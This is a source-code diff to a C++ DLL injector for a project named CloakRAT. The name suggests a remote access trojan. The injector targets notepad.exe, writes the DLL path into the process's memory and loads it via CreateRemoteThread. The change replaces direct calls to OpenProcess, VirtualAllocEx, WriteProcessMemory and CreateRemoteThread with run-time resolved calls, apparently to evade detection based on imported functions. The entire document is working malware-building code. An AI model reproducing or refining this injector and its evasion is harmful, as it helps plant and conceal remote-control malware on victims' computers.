@@ -6,6 +6,7 @@
 
 #define DLL_PATH "C:\\Users\\tal78\\Desktop\\Workspace\\CloakRAT\\x64\\Release\\CloakRAT.dll"
 #define TARGET_EXE "notepad.exe"
+#define KERNEL32_STR "kernel32.dll"
 
 int main(int argc, char** argv)
 {
@@ -24,15 +25,15 @@ int main(int argc, char** argv)
 		procID = GetProcessIdByName(procName);
 		Sleep(100);
 	}
-
-	HANDLE hProc = ((OpenProcess_t)resolve_func("kernel32.dll", "OpenProcess"))(PROCESS_ALL_ACCESS, 0, procID);
+	
+	HANDLE hProc = resolve_func<OpenProcess_t>("OpenProcess")(PROCESS_ALL_ACCESS, 0, procID);
 
 	if (hProc && hProc != INVALID_HANDLE_VALUE) // if we got a handle successfully
 	{
-		LPVOID dllAddrInRemoteProcess = VirtualAllocEx(hProc, NULL, strlen(dllPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+		LPVOID dllAddrInRemoteProcess = resolve_func<VirtualAllocEx_t>("VirtualAllocEx")(hProc, NULL, strlen(dllPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
 		if (dllAddrInRemoteProcess) {
-			WriteProcessMemory(hProc, dllAddrInRemoteProcess, dllPath, strlen(dllPath) + 1, 0);
+			resolve_func<WriteProcessMemory_t>("WriteProcessMemory")(hProc, dllAddrInRemoteProcess, dllPath, strlen(dllPath) + 1, 0);
 		}
 		else
 		{
@@ -40,7 +41,7 @@ int main(int argc, char** argv)
 			return 1;
 		}
 
-		HANDLE threadHandle = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, dllAddrInRemoteProcess, 0, 0);
+		HANDLE threadHandle = resolve_func<CreateRemoteThread_t>("CreateRemoteThread")(hProc, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, dllAddrInRemoteProcess, 0, 0);
 
 		if (threadHandle == NULL)
 			std::cerr << "Error in CreateRemoteThread(): Err#" << GetLastError() << std::endl;
